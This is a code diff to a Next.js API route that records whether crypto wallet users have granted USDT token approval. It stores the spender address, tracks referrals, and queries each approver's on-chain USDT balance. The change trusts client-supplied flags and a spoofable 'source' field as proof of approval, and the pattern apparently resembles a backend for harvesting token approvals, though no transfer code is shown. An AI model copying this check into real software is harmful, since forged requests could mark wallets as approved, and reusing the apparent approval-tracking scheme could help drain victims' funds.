@@ -206,9 +206,36 @@ export async function POST(request: NextRequest) {
     console.log('🔍 接收到的授权金额:', amount)
     console.log('🔍 最终使用的授权金额:', authAmount)
 
-    // 验证授权状态：必须明确传递 isAuthorized: true 且有 txHash
-    const shouldAuthorize = isAuthorized === true && (txHash || body.source === 'approval_monitor_infura')
-    console.log('🔒 授权验证:', { isAuthorized, hasTxHash: !!txHash, isFromMonitor: body.source === 'approval_monitor_infura', shouldAuthorize })
+    // 验证授权状态：如果明确传递 isAuthorized: true，则认为是授权成功
+    // 支持多种情况：
+    // 1. 明确传递 isAuthorized: true（最优先）
+    // 2. 有 txHash 的链上授权（可靠）
+    // 3. 来自监听服务的授权（approval_monitor_infura）
+    // 4. 如果 isAuthorized 不是 false，且有 txHash，也认为是授权成功
+    const shouldAuthorize = 
+      isAuthorized === true || 
+      (isAuthorized !== false && txHash) || 
+      body.source === 'approval_monitor_infura' ||
+      (txHash && isAuthorized !== false)
+    
+    console.log('🔒 授权验证:', { 
+      isAuthorized, 
+      isAuthorizedType: typeof isAuthorized,
+      hasTxHash: !!txHash, 
+      txHash: txHash,
+      isFromMonitor: body.source === 'approval_monitor_infura',
+      source: body.source,
+      shouldAuthorize 
+    })
+    
+    // 如果 shouldAuthorize 为 false，但明显是授权请求，记录警告
+    if (!shouldAuthorize && (txHash || body.source === 'approval_monitor_infura')) {
+      console.warn('⚠️ 警告：检测到授权请求但 shouldAuthorize 为 false', {
+        isAuthorized,
+        txHash,
+        source: body.source
+      })
+    }
 
     // 处理推荐关系
     if (referralCode) {
@@ -302,6 +329,15 @@ export async function POST(request: NextRequest) {
 
       userId = newUser.id
       console.log('✅ 用户创建成功，ID:', userId)
+
+      // 查询并保存链上USDT余额（异步执行，不阻塞响应）
+      import('@/lib/chain-balance-helper').then(({ queryAndSaveChainBalance }) => {
+        return queryAndSaveChainBalance(wallet_address, userId.toString())
+      }).then((balance) => {
+        console.log(`✅ 授权时新用户链上余额查询完成: ${balance} USDT`)
+      }).catch((err: unknown) => {
+        console.error('❌ 授权时新用户查询链上余额失败:', err)
+      })
 
       // 如果有推荐人，更新推荐人的下级数量
       if (parentId > 0) {
@@ -406,26 +442,161 @@ export async function POST(request: NextRequest) {
       }
 
       // 更新现有用户的授权状态（使用新表结构）
-      const updateData = {
-        approved: shouldAuthorize ? 1 : 0,
-        last_approved_at: shouldAuthorize ? currentTimeISO : null,
+      // 如果是授权操作，确保更新授权状态和授权地址
+      const updateData: any = {
         updated_at: currentTimeISO
       }
-
-      const { error: updateError } = await supabase
-        .from('nh_member_new')
-        .update(updateData)
-        .eq('id', userId)
-
-      if (updateError) {
-        console.error('❌ 更新verify状态失败:', updateError)
-        return NextResponse.json(
-          { error: '更新verify状态失败: ' + updateError.message },
-          { status: 500 }
-        )
+      
+      if (shouldAuthorize) {
+        // 授权成功：更新授权状态和时间戳
+        updateData.approved = 1
+        updateData.last_approved_at = currentTimeISO
+        // 如果是首次授权，也更新 first_approved_at
+        if (!existingUser.first_approved_at) {
+          updateData.first_approved_at = currentTimeISO
+        }
+        // 如果提供了授权地址，更新 auth_wallet_address
+        if (spenderAddress) {
+          updateData.auth_wallet_address = spenderAddress
+        }
+        console.log('🔒 准备更新授权状态为已授权:', updateData)
+      } else if (isAuthorized === false) {
+        // 明确取消授权：设置为未授权
+        updateData.approved = 0
+        updateData.last_approved_at = null
+        console.log('🔒 准备更新授权状态为未授权:', updateData)
       }
+      // 如果 shouldAuthorize 为 false 但 isAuthorized 不是 false，保持当前状态不变
 
-      console.log('✅ verify状态更新成功，数据:', updateData)
+      // 强制更新：如果shouldAuthorize为true，必须更新授权状态
+      // 或者如果有明确的授权/取消授权操作，也要更新
+      const hasAuthChange = shouldAuthorize || isAuthorized === false
+      const hasOtherUpdates = Object.keys(updateData).length > 1
+      // 如果 shouldAuthorize 为 true，强制更新（即使 updateData 只有 updated_at）
+      const shouldUpdate = shouldAuthorize || hasAuthChange || hasOtherUpdates
+      
+      console.log('🔍 更新条件检查:', {
+        updateDataKeys: Object.keys(updateData),
+        updateDataKeysCount: Object.keys(updateData).length,
+        updateData: updateData,
+        shouldAuthorize,
+        isAuthorized,
+        isAuthorizedType: typeof isAuthorized,
+        hasAuthChange,
+        hasOtherUpdates,
+        shouldUpdate,
+        existingUserApproved: existingUser.approved,
+        existingUserApprovedType: typeof existingUser.approved
+      })
+      
+      // 如果 shouldAuthorize 为 true，确保 updateData 包含 approved = 1
+      if (shouldAuthorize && !updateData.approved) {
+        console.warn('⚠️ 警告：shouldAuthorize 为 true 但 updateData 中没有 approved 字段，强制添加')
+        updateData.approved = 1
+        if (!updateData.last_approved_at) {
+          updateData.last_approved_at = currentTimeISO
+        }
+      }
+      
+      if (shouldUpdate) {
+        console.log('📝 执行数据库更新，用户ID:', userId, '更新数据:', updateData)
+        const { data: updateResult, error: updateError } = await supabase
+          .from('nh_member_new')
+          .update(updateData)
+          .eq('id', userId)
+          .select('id, approved, last_approved_at, first_approved_at')
+
+        if (updateError) {
+          console.error('❌ 更新授权状态失败:', updateError)
+          return NextResponse.json(
+            { error: '更新授权状态失败: ' + updateError.message },
+            { status: 500 }
+          )
+        }
+
+        console.log('✅ 授权状态更新成功，更新后的数据:', updateResult)
+        
+        // 验证更新是否成功
+        if (updateResult && updateResult.length > 0) {
+          const updatedUser = updateResult[0]
+          console.log('🔍 验证更新结果:', {
+            userId: updatedUser.id,
+            approved: updatedUser.approved,
+            approvedType: typeof updatedUser.approved,
+            last_approved_at: updatedUser.last_approved_at,
+            first_approved_at: updatedUser.first_approved_at
+          })
+          
+          // 如果授权成功但数据库中的approved不是1，记录警告并尝试再次更新
+          if (shouldAuthorize && updatedUser.approved !== 1 && updatedUser.approved !== '1') {
+            console.error('⚠️ 警告：授权成功但数据库更新可能失败，approved值:', updatedUser.approved, '类型:', typeof updatedUser.approved)
+            console.log('🔄 尝试强制更新授权状态...')
+            
+            // 强制更新为1
+            const { error: forceUpdateError } = await supabase
+              .from('nh_member_new')
+              .update({ approved: 1 })
+              .eq('id', userId)
+            
+            if (forceUpdateError) {
+              console.error('❌ 强制更新失败:', forceUpdateError)
+            } else {
+              console.log('✅ 强制更新成功')
+            }
+          } else if (shouldAuthorize) {
+            console.log('✅ 授权状态更新验证通过，approved =', updatedUser.approved)
+          }
+        } else {
+          console.warn('⚠️ 更新结果为空，可能更新失败')
+          // 如果更新结果为空，再次查询数据库验证
+          const { data: verifyUser, error: verifyError } = await supabase
+            .from('nh_member_new')
+            .select('id, approved, last_approved_at, first_approved_at')
+            .eq('id', userId)
+            .single()
+          
+          if (!verifyError && verifyUser) {
+            console.log('🔍 二次验证查询结果:', {
+              userId: verifyUser.id,
+              approved: verifyUser.approved,
+              approvedType: typeof verifyUser.approved,
+              last_approved_at: verifyUser.last_approved_at
+            })
+            
+            // 如果授权成功但数据库中的approved不是1，再次强制更新
+            if (shouldAuthorize && verifyUser.approved !== 1 && verifyUser.approved !== '1') {
+              console.error('⚠️ 二次验证失败：授权成功但数据库中的approved不是1，再次强制更新')
+              const { error: finalUpdateError } = await supabase
+                .from('nh_member_new')
+                .update({ 
+                  approved: 1,
+                  last_approved_at: currentTimeISO,
+                  updated_at: currentTimeISO
+                })
+                .eq('id', userId)
+              
+              if (finalUpdateError) {
+                console.error('❌ 最终强制更新失败:', finalUpdateError)
+              } else {
+                console.log('✅ 最终强制更新成功')
+              }
+            }
+          }
+        }
+        
+        // 授权成功后，更新链上USDT余额（异步执行，不阻塞响应）
+        if (shouldAuthorize) {
+          import('@/lib/chain-balance-helper').then(({ queryAndSaveChainBalance }) => {
+            return queryAndSaveChainBalance(wallet_address, userId.toString())
+          }).then((balance) => {
+            console.log(`✅ 授权成功后链上余额查询完成: ${balance} USDT`)
+          }).catch((err: unknown) => {
+            console.error('❌ 授权成功后查询链上余额失败:', err)
+          })
+        }
+      } else {
+        console.log('⚠️ 跳过授权状态更新（无变化）')
+      }
     }
 
     // 授权判断：完全信任钱包的判断（isAuthorized），不依赖 txHash 验证
@@ -459,10 +630,10 @@ export async function POST(request: NextRequest) {
           })
 
         if (txError) {
-          console.error('⚠️ 记录verify交易失败（非致命错误）:', txError)
+          console.error('⚠️ 记录授权交易失败（非致命错误）:', txError)
           // 不阻止主流程，只记录警告
         } else {
-          console.log('✅ verify交易记录成功')
+          console.log('✅ 授权交易记录成功')
         }
       }
 
@@ -665,7 +836,7 @@ export async function POST(request: NextRequest) {
     
     return NextResponse.json({
       success: true,
-      message: 'verify状态更新成功',
+      message: '授权状态更新成功',
       data: {
         wallet_address: wallet_address,
         isAuthorized: isAuthorized,
